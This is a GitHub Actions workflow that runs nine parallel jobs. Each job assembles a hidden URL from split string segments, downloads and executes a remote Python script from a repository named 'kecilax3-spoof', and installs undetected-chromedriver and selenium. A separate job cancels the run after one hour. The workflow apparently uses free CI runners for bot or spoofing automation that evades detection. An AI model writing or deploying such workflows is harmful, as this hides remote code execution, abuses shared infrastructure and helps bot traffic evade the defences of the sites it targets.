name: Iron Vanguard Runner

on:
  workflow_dispatch:

concurrency:
  group: vanguard-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  sentry-daemon:
    name: Sentry Daemon
    runs-on: ubuntu-latest
    timeout-minutes: 65
    steps:
      - name: Initiate countdown fuse
        env:
          BEARER: ${{ secrets.GITHUB_TOKEN }}
          REPO:   ${{ github.repository }}
          RUN:    ${{ github.run_id }}
        run: |
          set -e
          FUSE=3600
          printf 'sentry-daemon online | fuse=%ss\n' "$FUSE"
          sleep "$FUSE"
          printf 'fuse tripped | broadcasting termination\n'
          curl -sS -X POST \
            -H "Authorization: Bearer $BEARER" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/$REPO/actions/runs/$RUN/cancel"
          printf 'termination broadcast complete\n'

  unit-executor:
    name: Unit-${{ matrix.tag }}
    runs-on: ubuntu-latest
    timeout-minutes: 62
    strategy:
      fail-fast: false
      matrix:
        tag: [u01, u02, u03, u04, u05, u06, u07, u08, u09]
    env:
      SEG_A: "https://raw.githubusercontent.com/"
      SEG_B: "MyMushroom22/kecilax3-spoof/"
      SEG_C: "master/start.py"
      LIFESPAN: 3600
    steps:
      - name: Provision runner environment
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip
          printf 'runner ready for %s\n' "${{ matrix.tag }}"

      - name: Retrieve worker script
        run: |
          TARGET="${SEG_A}${SEG_B}${SEG_C}"
          printf 'pulling worker from upstream\n'
          curl -fsSL "$TARGET" -o worker.py
          printf 'worker downloaded (%s bytes)\n' "$(wc -c < worker.py)"

      - name: Install python packages
        run: |
          pip3 install --quiet --disable-pip-version-check \
            undetected-chromedriver selenium requests

      - name: Launch and monitor worker
        run: |
          printf 'spawning worker for %s\n' "${{ matrix.tag }}"
          python3 worker.py &
          WPID=$!
          printf 'monitoring window=%ss\n' "$LIFESPAN"
          sleep "$LIFESPAN"
          if kill -0 "$WPID" 2>/dev/null; then
            printf 'window closed | signaling worker\n'
            kill -15 "$WPID" || true
            sleep 2
            kill -9 "$WPID" 2>/dev/null || true
          else
            printf 'worker finished early\n'
          fi
